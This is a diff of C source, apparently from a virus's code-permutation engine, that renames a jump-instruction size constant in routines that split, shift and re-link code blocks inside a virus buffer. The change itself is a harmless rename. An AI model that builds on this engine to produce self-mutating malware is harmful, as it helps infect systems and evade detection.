@@ -70,7 +70,7 @@ static size_t	size_split_at_jump(const struct safe_ptr *ref_origin,
 		return 0;
 
 	size_t	good_jump_off = chosen_jump_ptr - ref_origin->ptr;
-	return good_jump_off + JUMP32_INST_SIZE;
+	return good_jump_off + JMP32_INST_SIZE;
 }
 
 static bool	split_ref(struct safe_ptr *ref_origin,
@@ -283,7 +283,7 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 		shift_labels(b->labels, b->nlabels, b->shift_amount);
 
 		if (b->trailing_block)
-			trailing_jumps_additionnal_shift += JUMP32_INST_SIZE;
+			trailing_jumps_additionnal_shift += JMP32_INST_SIZE;
 	}
 
 	return true;
@@ -354,8 +354,8 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref,
 	size_t	output_start = (size_t)virus_buffer_ref.ptr;
 	size_t	block_offset = (size_t)block_buffer - output_start;
 	size_t	tj_offset    = block_offset + b->ref.size;
-	void	*tj_buffer   = safe(virus_buffer_ref, tj_offset, JUMP32_INST_SIZE);
-	void	*tj_end      = tj_buffer + JUMP32_INST_SIZE;
+	void	*tj_buffer   = safe(virus_buffer_ref, tj_offset, JMP32_INST_SIZE);
+	void	*tj_end      = tj_buffer + JMP32_INST_SIZE;
 
 	if (tj_buffer == NULL)
 		return errors(ERR_VIRUS, _ERR_V_ADD_TRAILING_JUMP);
@@ -376,7 +376,7 @@ static bool	add_trailing_jump(struct safe_ptr virus_buffer_ref,
 	if (!write_jmp32(virus_buffer_ref, tj_offset, rel_jump))
 		return errors(ERR_THROW, _ERR_T_ADD_TRAILING_JUMP);
 
-	*virus_buffer_size += JUMP32_INST_SIZE;
+	*virus_buffer_size += JMP32_INST_SIZE;
 end:
 	return true;
 }
